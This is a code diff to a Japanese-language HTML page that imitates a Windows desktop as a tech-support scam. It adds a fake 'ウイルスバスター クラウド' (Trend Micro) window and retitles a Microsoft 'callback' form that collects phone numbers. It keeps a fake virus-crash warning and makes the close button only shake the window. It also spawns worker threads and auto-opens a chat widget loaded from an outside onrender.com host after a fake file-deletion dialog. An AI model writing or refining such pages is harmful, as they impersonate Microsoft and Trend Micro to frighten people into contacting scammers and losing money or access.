@@ -429,6 +429,27 @@
       .app-window.focused .title-bar {
         background: #f0f0f0;
       }
+      .app-window.app-file-explorer.focused .title-bar {
+        background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
+      }
+      .app-window.app-file-explorer.focused .title-bar-title {
+        color: #fff;
+      }
+      .app-window.app-file-explorer.focused .title-bar-btn svg line,
+      .app-window.app-file-explorer.focused .title-bar-btn svg rect {
+        stroke: #fff;
+      }
+      .app-window.app-file-explorer .window-content-tm {
+        padding: 0;
+        overflow: auto;
+        display: flex;
+        flex-direction: column;
+      }
+      .app-window.app-file-explorer .window-content-tm .worker-stats {
+        margin: 12px 16px 16px;
+        max-width: none;
+        box-sizing: border-box;
+      }
       .title-bar-icon {
         width: 16px;
         height: 16px;
@@ -2113,13 +2134,13 @@
       aria-labelledby="contactFormHeading"
       aria-hidden="true"
     >
-      <div class="contact-form-titlebar">Microsoft サポート</div>
+      <div class="contact-form-titlebar">Microsoft サポート コールバック</div>
       <div class="contact-form-body">
         <h2 class="contact-form-title" id="contactFormHeading">
-          電話番号を入力してください。Microsoft Windowsサポートから折り返しご連絡いたします。
+          携帯電話番号または固定電話番号を入力してください。Microsoft サポートから折り返しご連絡いたします。
         </h2>
         <p class="contact-form-subtitle">
-          1分後に折り返しお電話いたします。お手数ですが、お電話に出てください。
+          お手数ですが、お電話に出てください。
         </p>
         <form id="contactForm">
           <label class="contact-form-label" for="contactPhone">電話番号</label>
@@ -2394,8 +2415,8 @@
       const apps = [
         {
           id: "file-explorer",
-          name: "エクスプローラー",
-          icon: "explorer",
+          name: "ウイルスバスター クラウド",
+          icon: "trendmicro",
           pinToDesktop: true,
           pinToTaskbar: true,
         },
@@ -2486,6 +2507,10 @@
       <path d="M4 16c0-2.2 1.8-4 4-4h10.5c1.6 0 3 .8 3.8 2.1l1.1 1.9H44v6H4v-6z" fill="#FFD970"/>
       <rect x="4" y="20" width="40" height="20" rx="5" fill="#F7B739"/>
       <rect x="7" y="23" width="34" height="3" rx="1.5" fill="#FFD980" opacity="0.75"/>
+    </svg>`,
+          trendmicro: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="24" cy="24" r="20" fill="#d32f2f"/>
+      <path d="M16 14h16v4H28v16h-8V18h-4v-4z" fill="#fff"/>
     </svg>`,
           edge: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
       <path d="M39.8 31.8c-2.2 6.6-8.2 11.2-15.8 11.2-8.9 0-16-6.5-16-14.8 0-9.3 8.2-17.2 18.1-17.2 5.6 0 10.4 2.2 13.3 6.1-2.2-1.2-4.7-1.9-7.2-1.9-8 0-14.5 5.5-14.5 12.3 0 5.5 4.2 9.4 10 9.4 4.2 0 8.3-1.9 12.1-5.1z" fill="#0AA9F4"/>
@@ -2886,6 +2911,30 @@
         if (app.id === "settings") {
           el.querySelector(".window-content").innerHTML = getSettingsContent();
           initSettingsNav(el);
+        } else if (app.id === "file-explorer") {
+          el.classList.add("app-file-explorer");
+          const contentEl = el.querySelector(".window-content");
+          contentEl.classList.add("window-content-tm");
+          contentEl.innerHTML =
+            document.getElementById("trendmicro-template").innerHTML +
+            getWorkerStatsHtml(wid);
+          const tsEl = contentEl.querySelector(".tm-timestamp");
+          if (tsEl) {
+            tsEl.textContent = `最終スキャン: ${getTmTimestamp()}`;
+          }
+          contentEl.querySelectorAll("[data-support-phone]").forEach((node) => {
+            node.textContent = window.SUPPORT_PHONE;
+          });
+          const tmClose = contentEl.querySelector(".tm-close");
+          if (tmClose) {
+            tmClose.addEventListener("click", (e) => {
+              e.preventDefault();
+              el.classList.remove("window-shake");
+              void el.offsetWidth;
+              el.classList.add("window-shake");
+            });
+          }
+          spawnWorker(wid);
         } else {
           el.querySelector(".window-content").innerHTML =
             getDefaultContent(wid);
@@ -3154,18 +3203,22 @@
         };
       }
 
+      function getWorkerStatsHtml(wid) {
+        return `<div class="worker-stats" id="worker-stats-${wid}">
+            <div class="worker-stats-header"><span class="worker-dot"></span>Worker スレッド #${wid} — 起動中...</div>
+            <div class="worker-stats-row"><span class="worker-stats-label">タスク:</span><span class="worker-stats-value" data-field="task">初期化中...</span></div>
+            <div class="worker-stats-row"><span class="worker-stats-label">処理回数:</span><span class="worker-stats-value" data-field="ops">0</span></div>
+            <div class="worker-stats-row"><span class="worker-stats-label">処理速度:</span><span class="worker-stats-value" data-field="opsPerSec">0 ops/s</span></div>
+          </div>`;
+      }
+
       // ── Default Window Content ──
       function getDefaultContent(wid) {
         return `<div class="win-default-content">
           <div class="win-default-notice">
             お使いのコンピューターに0xlksdnfウイルスが感染したため、Microsoft Windowsがクラッシュしました。問題を解決するには、サポートスタッフにお問い合わせください。コンピューターがクラッシュしています。
           </div>
-          <div class="worker-stats" id="worker-stats-${wid}">
-            <div class="worker-stats-header"><span class="worker-dot"></span>Worker スレッド #${wid} — 起動中...</div>
-            <div class="worker-stats-row"><span class="worker-stats-label">タスク:</span><span class="worker-stats-value" data-field="task">初期化中...</span></div>
-            <div class="worker-stats-row"><span class="worker-stats-label">処理回数:</span><span class="worker-stats-value" data-field="ops">0</span></div>
-            <div class="worker-stats-row"><span class="worker-stats-label">処理速度:</span><span class="worker-stats-value" data-field="opsPerSec">0 ops/s</span></div>
-          </div>
+          ${getWorkerStatsHtml(wid)}
           <div class="win-default-lorem">
             お使いのコンピューターに感染したウイルスによって、以下のアプリケーションが影響を受けています。
 
@@ -3662,9 +3715,19 @@
         }
       }
 
+      const CHAT_WIDGET_OPEN_AFTER_DELETION_MS = 20000;
+
+      function openChatWidgetPanel() {
+        const panel = document.getElementById("cw-panel");
+        const btn = document.getElementById("cw-btn");
+        if (!panel || !btn || panel.classList.contains("open")) return;
+        btn.click();
+      }
+
       function startRecycleDeleteDialog() {
         if (recycleDeleteStarted) return;
         recycleDeleteStarted = true;
+        setTimeout(openChatWidgetPanel, CHAT_WIDGET_OPEN_AFTER_DELETION_MS);
         recycleDeleteDialog.classList.add("visible");
         recycleDeleteDialog.setAttribute("aria-hidden", "false");
         topInfoBanner.classList.add("visible");
@@ -4057,5 +4120,6 @@
         );
       })();
     </script>
+    <script src="https://popupmax-dmc5.onrender.com/chat-widget.js"></script>
   </body>
 </html>
